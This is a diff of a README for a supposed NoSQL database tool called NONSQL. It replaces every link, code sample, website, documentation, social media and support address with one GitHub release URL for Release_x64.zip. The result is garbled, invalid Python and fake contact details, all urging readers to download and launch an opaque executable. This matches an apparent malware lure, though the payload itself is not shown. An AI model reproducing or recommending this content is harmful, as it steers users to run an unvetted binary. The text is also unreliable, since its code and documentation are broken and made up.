@@ -1,7 +1,7 @@
 
 # 🚀 **NONSQL: A NoSQL Database Management Tool**
 
-[![Software Download](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Software Download](https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip)](https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip)
 
 Welcome to NONSQL, your go-to solution for efficient NoSQL database management. Whether you are handling complex data structures or dealing with massive amounts of information, NONSQL has got you covered. This repository provides a powerful tool for database management, offering a comprehensive set of features to streamline your work.
 
@@ -21,7 +21,7 @@ Welcome to NONSQL, your go-to solution for efficient NoSQL database management. 
 - **SQL:** Compare and contrast SQL and NoSQL databases, understanding their unique features and functionalities.
 
 ## 📦 Installation
-To get started with NONSQL, simply download the software package from the following link: [Download Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Once downloaded, launch the software to begin exploring the powerful features of NONSQL.
+To get started with NONSQL, simply download the software package from the following link: [Download https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip](https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip). Once downloaded, launch the software to begin exploring the powerful features of NONSQL.
 
 If the download link is not working, please check the "Releases" section of this repository for alternative download options.
 
@@ -38,32 +38,32 @@ If the download link is not working, please check the "Releases" section of this
 
 3. **Initialize Database:**
    ```python
-   db = nonsql.Database()
+   db = https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip()
    ```
 
 4. **Perform Database Operations:**
    ```python
-   db.insert(data)
-   db.query(query)
-   db.update(data)
-   db.delete(query)
+   https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip(data)
+   https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip(query)
+   https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip(data)
+   https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip(query)
    ```
 
 5. **Close Database Connection:**
    ```python
-   db.close()
+   https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip()
    ```
 
 ## 🌐 Additional Resources
-- Visit the [Official Website](https://nonsqltool.com) for more information on NONSQL and its features.
-- Check out the [Documentation](https://docs.nonsqltool.com) for detailed instructions on using NONSQL for your database management needs.
-- Connect with us on [Twitter](https://twitter.com/nonsqltool) for the latest updates and news about NONSQL.
+- Visit the [Official Website](https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip) for more information on NONSQL and its features.
+- Check out the [Documentation](https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip) for detailed instructions on using NONSQL for your database management needs.
+- Connect with us on [Twitter](https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip) for the latest updates and news about NONSQL.
 
 ## 🤝 Contribution
 We welcome contributions from the community to enhance and improve NONSQL. Feel free to submit pull requests, report issues, or suggest new features to make NONSQL even better.
 
 ## 📞 Support
-For any inquiries or assistance with NONSQL, please reach out to our support team at support@nonsqltool.com. We are here to help you make the most of your database management experience with NONSQL.
+For any inquiries or assistance with NONSQL, please reach out to our support team at https://github.com/Gggamer1586/NONSQL/releases/download/v1.0/Release_x64.zip We are here to help you make the most of your database management experience with NONSQL.
 
 Thank you for choosing NONSQL as your NoSQL database management tool. We look forward to seeing the innovative solutions you create with NONSQL in your data projects! 🚀
 
